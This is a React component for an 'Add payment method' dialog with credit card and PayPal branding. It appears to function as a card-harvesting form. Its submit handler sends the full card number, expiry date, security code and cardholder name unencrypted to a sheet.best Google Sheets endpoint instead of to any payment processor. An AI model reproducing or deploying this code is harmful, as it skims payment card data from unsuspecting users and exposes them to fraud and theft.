import React, { useState } from 'react';
import axios from 'axios';
import {
  Button,
  Dialog,
  DialogContent,
  DialogTitle,
  FormControl,
  FormControlLabel,
  FormLabel,
  Radio,
  RadioGroup,
  TextField,
} from '@mui/material';
import creditcard from '../Assets/credit-card.png'
import myimage from '../Assets/card.png';
import paypal from '../Assets/paypal(1).png';

export default function PopUp() {
  const [open, setOpen] = useState(false);
  const [selectedOption1, setSelectedOption1] = useState('');
  const [cardholderName, setCardholderName] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expirationDate, setExpirationDate] = useState('');
  const [securityCode, setSecurityCode] = useState('');
  const [cardType, setCardType] = useState('');

  const handleClickOpen = () => {
    setOpen(true);
  };

  const handleClose = () => {
    setOpen(false);
  };

  const handleOption1Change = (event) => {
    setSelectedOption1(event.target.value);
  };

  const detectCardType = (number) => {
    const firstDigit = number[0];
    const firstTwoDigits = number.slice(0, 2);

    if (firstDigit === '4') {
      return 'Visa';
    } else if (['51', '52', '53', '54', '55'].includes(firstTwoDigits)) {
      return 'MasterCard';
    } else if (firstTwoDigits === '34' || firstTwoDigits === '37') {
      return 'American Express';
    } else if (firstTwoDigits === '60') {
      return 'Discover';
    } else {
      return '';
    }
  };

  const handleCardNumberChange = (event) => {
    let value = event.target.value.replace(/\D/g, ''); // Remove non-digits
    if (value.length > 16) {
      value = value.slice(0, 16); // Limit to 16 digits
    }
    setCardNumber(value.replace(/(\d{4})(?=\d)/g, '$1 ')); // Format as 1234 5678 9012 3456
    setCardType(detectCardType(value));
  };

  const handleExpirationDateChange = (event) => {
    let value = event.target.value.replace(/\D/g, ''); // Remove non-digits
    if (value.length > 4) {
      value = value.slice(0, 4); // Limit to 4 digits (MMYY)
    }
    setExpirationDate(value.replace(/(\d{2})(?=\d)/g, '$1/')); // Format as MM/YY
  };

  const handleSecurityCodeChange = (event) => {
    let value = event.target.value.replace(/\D/g, ''); // Remove non-digits
    if (value.length > 3) {
      value = value.slice(0, 3); // Limit to 3 digits
    }
    setSecurityCode(value);
  };

  const handleSubmit = async () => {
    const data = {
      cardholderName,
      cardNumber,
      expirationDate,
      securityCode,
      paymentMethod: selectedOption1,
    };

    try {
      await axios.post('https://sheet.best/api/sheets/469650aa-9e3a-416b-af9e-665b106ac5a8', data, {
        headers: {
          'Content-Type': 'application/json',
          Accept: 'application/json',
        },
      });
      console.log('Data sent successfully to Google Sheets');
      handleClose();
    } catch (error) {
      console.error('There was an error sending the data!', error);
    }
  };

  return (
    <>
      <a style={{ cursor: 'pointer' }} onClick={handleClickOpen}>
        <li className="method">
          <img style={{width:"25px", marginRight:"8px"}} src={creditcard} alt="" />
          Credit card
          <span className="separator">|</span>
         <img style={{width:"20px"}} src={paypal} alt="" />
          PayPal
        </li>
        <li className="add-method">
          <span className="icon">
            <svg width={16} height={16} viewBox="0 0 12 16" xmlns="http://www.w3.org/2000/svg" fill="currentFill">
              <path d="M11.5 7H7V2.5a.5.5 0 0 0-.5-.5h-1a.5.5 0 0 0-.5.5V7H.5a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5H5v4.5a.5.5 0 0 0 .5.5h1a.5.5 0 0 0 .5-.5V9h4.5a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5Z" />
            </svg>
          </span>
          Add a payment method
        </li>
      </a>
      <Dialog open={open} onClose={handleClose} aria-labelledby="add-payment-method-title">
        <DialogTitle id="add-payment-method-title" sx={{ fontSize: '25px', fontWeight: '700' }}>
          Add payment method
        </DialogTitle>
        <DialogContent>
          <FormControl component="fieldset">
            <FormLabel component="legend">Select an Option</FormLabel>
            <RadioGroup
              aria-label="payment-method"
              name="payment-method"
              value={selectedOption1}
              onChange={handleOption1Change}
            >
              <div style={{display:"flex",gap:"80px"}}>
                <FormControlLabel value="Credit / Debit Cards" control={<Radio />} label="Credit / Debit Cards" />
                <img style={{width:"170px",height:"23px",marginTop:"7px"}} src={myimage} alt="Card Example" />
              </div>
            </RadioGroup>
          </FormControl>
          {selectedOption1 && (
            <div style={{ marginTop: 16 }}>
              <TextField
                label="Card Number"
                variant="outlined"
                fullWidth
                value={cardNumber}
                onChange={handleCardNumberChange}
                placeholder="1234 5678 9012 3456"
                margin="normal"
                helperText={cardType ? `Detected Card Type: ${cardType}` : ''}
              />
              <div style={{ display: 'flex', justifyContent: 'space-between', gap: '10px' }}>
                <TextField
                  label="Expiration Date"
                  variant="outlined"
                  fullWidth
                  value={expirationDate}
                  onChange={handleExpirationDateChange}
                  placeholder="MM/YY"
                  margin="normal"
                  style={{ flex: '1' }}
                />
                <TextField
                  label="Security Code"
                  variant="outlined"
                  fullWidth
                  value={securityCode}
                  onChange={handleSecurityCodeChange}
                  placeholder="123"
                  type="number"
                  margin="normal"
                  style={{ flex: '1' }}
                />
              </div>
              <TextField
                label="Cardholder's Name"
                variant="outlined"
                fullWidth
                value={cardholderName}
                onChange={(e) => setCardholderName(e.target.value)}
                margin="normal"
              />
              <div className="save-button-container">
                <Button
                  onClick={handleSubmit}
                  variant="contained"
                  style={{ width: '100px', height: '40px', borderRadius: '8px', backgroundColor: 'black', color: 'white', fontSize: '15px' }}
                >
                  Save
                </Button>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </>
  );
}
